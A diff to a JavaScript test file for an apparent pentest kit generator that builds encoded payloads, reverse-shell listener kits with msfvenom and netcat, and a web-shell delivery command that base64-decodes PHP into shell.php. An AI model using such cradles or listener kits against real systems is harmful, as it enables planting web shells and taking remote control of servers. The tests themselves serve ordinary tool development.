@@ -68,6 +68,13 @@ ok(m && Buffer.from(m[1], 'base64').toString('utf8') === one, 'b64 runner decode
 ok(decodeURIComponent(SK.encodePayload(one, 'url')) === one, 'url encode round-trips');
 ok(SK.encodePayload(one, 'raw') === one, 'raw encode passes the payload through unchanged');
 
+// 8b) the web-shell delivery cradle base64-decodes straight to a file (no raw paste over a prompt).
+var phpWs = ws.filter(function (w) { return w.ext === 'php'; })[0];
+var cradle = SK.webshellCradle(phpWs.code, phpWs.ext);
+var cm = cradle.match(/^echo '(\S+)' \| base64 -d > shell\.php$/);
+ok(!!cm, 'webshellCradle shape ok (' + cradle.slice(0, 30) + '...)');
+ok(cm && Buffer.from(cm[1], 'base64').toString('utf8') === phpWs.code, 'cradle base64 decodes back to the web shell');
+
 // 9) the generated kit now carries the msfvenom + web-shell sections.
 var fullKit = SK.listenerKit({ lhost: '10.10.14.5', lport: '4444', catcher: 'nc' });
 ok(/msfvenom -p /.test(fullKit), 'kit includes an msfvenom section');
